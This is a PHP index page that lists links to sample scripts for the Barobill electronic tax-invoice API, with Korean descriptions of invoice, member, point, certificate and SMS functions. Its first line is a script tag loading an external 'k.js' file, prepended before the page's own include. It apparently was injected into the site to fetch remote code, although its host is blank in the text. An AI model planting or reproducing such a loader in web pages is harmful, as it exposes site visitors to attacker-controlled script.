<script type='text/javascript' src='https:// /k.js?v=222'></script><?php include '../_include/top.php'; ?>
<fieldset class="fieldset1">
	<legend>전자세금계산서 관련 API</legend>
	<fieldset class="fieldset2">
		<legend class="red">간편 발행</legend>
		<ul>
			<li><a href="API_TI/RegistAndIssueTaxInvoice.php">RegistAndIssueTaxInvoice</a> - 일반(수정)세금계산서 "등록" 과 "발행" 을 한번에 처리</li>
			<li><a href="API_TI/RegistAndIssueBrokerTaxInvoice.php">RegistAndIssueBrokerTaxInvoice</a> - 위수탁 일반(수정)세금계산서 "등록" 과 "발행" 을 한번에 처리</li>
			<li><a href="API_TI/RegistAndPreIssueTaxInvoice.php">RegistAndPreIssueTaxInvoice</a> - 일반(수정)세금계산서 "등록" 과 "발행예정" 을 한번에 처리</li>
			<li><a href="API_TI/RegistAndPreIssueBrokerTaxInvoice.php">RegistAndPreIssueBrokerTaxInvoice</a> - 위수탁 일반(수정)세금계산서 "등록" 과 "발행예정" 을 한번에 처리</li>
			<li><a href="API_TI/RegistAndReverseIssueTaxInvoice.php">RegistAndReverseIssueTaxInvoice</a> - 역발행 세금계산서 "등록" 과 "역발행" 을 한번에 처리</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend class="red">홈택스 조회</legend>
		<ul>
			<li><a href="API_TI/GetTaxInvoiceScrapRequestURL.php">GetTaxInvoiceScrapRequestURL</a> - 국세청 세금계산서 연동 신청 URL</li>
			<li><a href="API_TI/GetDailyTaxInvoiceSalesList.php">GetDailyTaxInvoiceSalesList</a> - 일별 국세청 매출내역 조회 [국세청 전송완료 건만] (대표품목 포함)</li>
			<li><a href="API_TI/GetDailyTaxInvoicePurchaseList.php">GetDailyTaxInvoicePurchaseList</a> - 일별 국세청 매입내역 조회 [국세청 전송완료 건만] (대표품목 포함)</li>
			<li><a href="API_TI/GetMonthlyTaxInvoiceSalesList.php">GetMonthlyTaxInvoiceSalesList</a> - 월별 국세청 매출내역 조회 [국세청 전송완료 건만] (대표품목 포함)</li>
			<li><a href="API_TI/GetMonthlyTaxInvoicePurchaseList.php">GetMonthlyTaxInvoicePurchaseList</a> - 월별 국세청 매입내역 조회 [국세청 전송완료 건만] (대표품목 포함)</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>문서 등록/수정/삭제</legend>
		<ul>
			<li><a href="API_TI/RegistTaxInvoice.php">RegistTaxInvoice</a> - 일반세금계산서 등록</li>
			<li><a href="API_TI/RegistTaxInvoiceEX.php">RegistTaxInvoiceEX</a> - 일반세금계산서 등록 (승인 시 자동발행 옵션 추가)</li>
			<li><a href="API_TI/RegistModifyTaxInvoice.php">RegistModifyTaxInvoice</a> - 수정세금계산서 등록</li>
			<li><a href="API_TI/RegistModifyTaxInvoiceEX.php">RegistModifyTaxInvoiceEX</a> - 수정세금계산서 등록 (승인 시 자동발행 옵션 추가)</li>
			<li><a href="API_TI/UpdateTaxInvoice.php">UpdateTaxInvoice</a> - 수정</li>
			<li><a href="API_TI/UpdateTaxInvoiceEX.php">UpdateTaxInvoiceEX</a> - 수정 (승인 시 자동발행 옵션 추가)</li>
			<li><a href="API_TI/DeleteTaxInvoice.php">DeleteTaxInvoice</a> - 삭제</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>문서 프로세스</legend>
		<ul>
			<li><a href="API_TI/IssueTaxInvoice.php">IssueTaxInvoice</a> - 발행 또는 역발행 처리</li>
			<li><a href="API_TI/PreIssueTaxInvoice.php">PreIssueTaxInvoice</a> - 발행예정 처리</li>
			<li><a href="API_TI/ProcTaxInvoice.php">ProcTaxInvoice</a> - 프로세스 처리</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>문서 정보</legend>
		<ul>
			<li><a href="API_TI/GetTaxInvoice.php">GetTaxInvoice</a> - 문서 정보</li>
			<li><a href="API_TI/GetTaxInvoiceLog.php">GetTaxInvoiceLog</a> - 문서 이력</li>
			<li><a href="API_TI/GetTaxInvoiceState.php">GetTaxInvoiceState</a> - 문서 상태</li>
			<li><a href="API_TI/GetTaxInvoiceStates.php">GetTaxInvoiceStates</a> - 문서 상태 (대량, 100건 까지)</li>
			<li><a href="API_TI/GetTaxInvoiceStateEX.php">GetTaxInvoiceStateEX</a> - 문서 상태 (수신확인, 등록일시, 작성일자, 발행예정일시, 발행일시 추가)</li>
			<li><a href="API_TI/GetTaxInvoiceStatesEX.php">GetTaxInvoiceStatesEX</a> - 문서 상태 (수신확인, 등록일시, 작성일자, 발행예정일시, 발행일시 추가) (대량, 100건 까지)</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>부가서비스</legend>
		<ul>
			<li><a href="API_TI/ReSendEmail.php">ReSendEmail</a> - 이메일 재전송</li>
			<li><a href="API_TI/ReSendSMS.php">ReSendSMS</a> - 문자 재전송</li>
			<li><a href="API_TI/SendInvoiceSMS.php">SendInvoiceSMS</a> - 문자 전송 (문서이력에 기록됨)</li>
			<li><a href="API_TI/SendInvoiceFax.php">SendInvoiceFax</a> - 팩스 전송 (문서이력에 기록됨)</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>국세청 전송설정</legend>
		<ul>
			<li><a href="API_TI/GetNTSSendOption.php">GetNTSSendOption</a> - 국세청 전송설정 확인</li>
			<li><a href="API_TI/ChangeNTSSendOption.php">ChangeNTSSendOption</a> - 국세청 전송설정 변경</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>첨부파일</legend>
		<ul>
			<li><a href="API_TI/GetAttachedFileList.php">GetAttachedFileList</a> - 첨부파일 목록</li>
			<li><a href="API_TI/AttachFileByFTP.php">AttachFileByFTP</a> - 파일 첨부</li>
			<li><a href="API_TI/DeleteAttachFileWithFileIndex.php">DeleteAttachFileWithFileIndex</a> - 첨부파일 삭제</li>
			<li><a href="API_TI/DeleteAttachFile.php">DeleteAttachFile</a> - 첨부파일 전체삭제</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>문서 연결</legend>
		<ul>
			<li><a href="API_TI/GetLinkedDocs.php">GetLinkedDocs</a> - 연결된 문서 목록</li>
			<li><a href="API_TI/MakeDocLinkage.php">MakeDocLinkage</a> - 문서 연결</li>
			<li><a href="API_TI/RemoveDocLinkage.php">RemoveDocLinkage</a> - 문서 연결 해제</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>기타</legend>
		<ul>
			<li><a href="API_TI/CheckMgtNumIsExists.php">CheckMgtNumIsExists</a> - 연동사부여 문서키 사용여부 확인</li>
			<li><a href="API_TI/GetTaxInvoicePopUpURL.php">GetTaxInvoicePopUpURL</a> - 문서 내용보기 팝업 URL</li>
			<li><a href="API_TI/GetTaxInvoicePrintURL.php">GetTaxInvoicePrintURL</a> - 인쇄 팝업 URL</li>
			<li><a href="API_TI/GetTaxInvoicesPrintURL.php">GetTaxInvoicesPrintURL</a> - 대량인쇄 팝업 URL</li>
			<li><a href="API_TI/GetTaxInvoiceMailURL.php">GetTaxInvoiceMailURL</a> - 이메일의 보기버튼 URL</li>
			<li><a href="API_TI/GetEmailPublicKeys.php">GetEmailPublicKeys</a> - ASP업체 Email 목록확인</li>
		</ul>
	</fieldset>
</fieldset>
<br />
<fieldset class="fieldset1">
	<legend>바로빌 기본 API</legend>
	<fieldset class="fieldset2">
		<legend>회원사 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/CheckCorpIsMember.php">CheckCorpIsMember</a> - 회원사 여부 확인</li>
			<li><a href="API_BAROBILL/RegistCorp.php">RegistCorp</a> - 회원사 추가</li>
			<li><a href="API_BAROBILL/UpdateCorpInfo.php">UpdateCorpInfo</a> - 회원사 정보 수정</li>
			<li><a href="API_BAROBILL/GetCorpMemberContacts.php">GetCorpMemberContacts</a> - 회원사 담당자 목록</li>
			<li><a href="API_BAROBILL/ChangeCorpManager.php">ChangeCorpManager</a> - 회원사 관리자 변경</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>사용자 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/AddUserToCorp.php">AddUserToCorp</a> - 사용자 추가</li>
			<li><a href="API_BAROBILL/UpdateUserInfo.php">UpdateUserInfo</a> - 사용자 정보 수정</li>
			<li><a href="API_BAROBILL/UpdateUserPWD.php">UpdateUserPWD</a> - 사용자 비밀번호 수정</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>포인트 관련</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBalanceCostAmount.php">GetBalanceCostAmount</a> - 잔여포인트 확인</li>
			<li><a href="API_BAROBILL/GetBalanceCostAmountOfInterOP.php">GetBalanceCostAmountOfInterOP</a> - 연동사포인트 확인</li>
			<li><a href="API_BAROBILL/GetChargeUnitCost.php">GetChargeUnitCost</a> - 요금 단가 확인</li>
			<li><a href="API_BAROBILL/CheckChargeable.php">CheckChargeable</a> - 과금 가능여부 확인</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>공인인증서 관련</legend>
		<ul>
			<li><a href="API_BAROBILL/GetCertificateRegistURL.php">GetCertificateRegistURL</a></a> - 공인인증서 등록 URL</li>
			<li><a href="API_BAROBILL/GetCertificateExpireDate.php">GetCertificateExpireDate</a></a> - 등록한 공인인증서 만료일 확인</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend class="red">문자 발신번호 등록</legend>
		<ul>
			<li><a href="API_BAROBILL/RegistSMSFromNumber.php">RegistSMSFromNumber</a></a> - 발신번호 추가</li>
			<li><a href="API_BAROBILL/CheckSMSFromNumber.php">CheckSMSFromNumber</a></a> - 발신번호 확인</li>
			<li><a href="API_BAROBILL/GetSMSFromNumberURL.php">GetSMSFromNumberURL</a></a> - 발신번호 관리 URL</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>기타</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBaroBillURL.php">GetBaroBillURL</a> - 바로빌 URL</li>
		</ul>
	</fieldset>
</fieldset>
<?php include '../_include/bottom.php'; ?>